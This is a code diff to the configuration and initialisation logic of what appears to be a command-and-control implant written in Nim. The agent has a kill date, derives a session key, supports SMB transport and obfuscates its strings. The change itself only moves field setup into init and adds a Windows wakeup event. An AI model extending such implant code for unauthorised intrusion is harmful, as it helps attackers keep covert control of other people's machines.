@@ -1,3 +1,4 @@
+import winim/lean
 import tables
 import ../utils/io
 import ../../../common/[utils, crypto, profile, serialize]
@@ -50,10 +51,7 @@ proc deserializeConfiguration(config: string): AgentCtx =
             killDate: cast[int64](unpacker.getUint64()),
             sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
             agentPublicKey: agentKeyPair.publicKey,
-            profile: parseString(unpacker.getDataWithLengthPrefix()),
-            registered: false,
-            links: initTable[uint32, uint32](),
-            jobs: @[]
+            profile: parseString(unpacker.getDataWithLengthPrefix())
         ) 
 
     when defined(TRANSPORT_SMB): 
@@ -80,10 +78,7 @@ proc deserializeConfiguration(config: string): AgentCtx =
             killDate: cast[int64](unpacker.getUint64()),
             sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
             agentPublicKey: agentKeyPair.publicKey,
-            profile: parseString(unpacker.getDataWithLengthPrefix()),
-            registered: false,
-            links: initTable[uint32, uint32](),
-            jobs: @[]
+            profile: parseString(unpacker.getDataWithLengthPrefix())
         ) 
 
     wipeKey(agentKeyPair.privateKey)
@@ -95,7 +90,12 @@ proc init*(T: type AgentCtx): AgentCtx =
         when not defined(CONFIGURATION):
             raise newException(CatchableError, protect("Missing agent configuration."))
 
-        return deserializeConfiguration(CONFIGURATION)
+        var ctx = deserializeConfiguration(CONFIGURATION)
+        ctx.registered = false
+        ctx.links = initTable[uint32, uint32]() 
+        ctx.jobs = @[]
+        ctx.hWakeupEvent = CreateEventA(nil, FALSE, FALSE, nil)
+        return ctx
 
     except CatchableError as err:
         print protect("[-] "), err.msg
